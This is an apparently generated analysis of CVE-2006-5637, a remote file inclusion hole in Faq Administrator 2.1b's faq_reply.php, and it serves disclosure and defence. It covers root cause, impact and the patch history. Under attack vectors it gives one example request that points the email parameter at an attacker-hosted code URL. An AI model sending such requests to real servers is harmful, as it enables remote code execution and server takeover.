Based on the provided content, here's an analysis of CVE-2006-5637:

**Root cause of vulnerability:**

*   The `faq_reply.php` script in Faq Administrator 2.1b uses an unfiltered `$email` variable in an `include()` statement:  `include ("$email");` This allows for remote file inclusion.

**Weaknesses/vulnerabilities present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is the ability to include remote files due to the lack of sanitization of the `$email` variable. This can lead to execution of arbitrary code from a malicious source.
*   **Unsanitized Input:** The application does not validate the input provided in the `$email` parameter before using it in an include statement.

**Impact of exploitation:**

*   **Remote Code Execution (RCE):** By including a file from a remote attacker-controlled server, an attacker can execute arbitrary code on the server hosting the vulnerable application. This can compromise the entire server and its data.

**Attack vectors:**

*   **HTTP GET Request:** The attacker sends a specially crafted HTTP GET request to `faq_reply.php` and provides a malicious URL in the `email` parameter. For example: `http://localhost/path/faq_reply.php?email=http://EvElCoDe.txt?`

**Required attacker capabilities/position:**

*   **Network Access:** The attacker needs to have network connectivity to the target server.
*   **Malicious server:** The attacker must control a server where a malicious file is hosted that can be included by the vulnerable application.

**Additional Details:**

*   The advisory mentions that Faq Administrator version 3.0 was released with a "security patch release" and the vulnerable files were removed from the package.
*   Other potentially vulnerable files were also removed (c2.php, c3.php, blank.php, faqsend.php, hist_replycount.php, mail.php, reply_count.php, total_asked.php) which suggests potential vulnerabilities in these files as well. However, the main vulnerability targeted is the RFI via faq_reply.php.
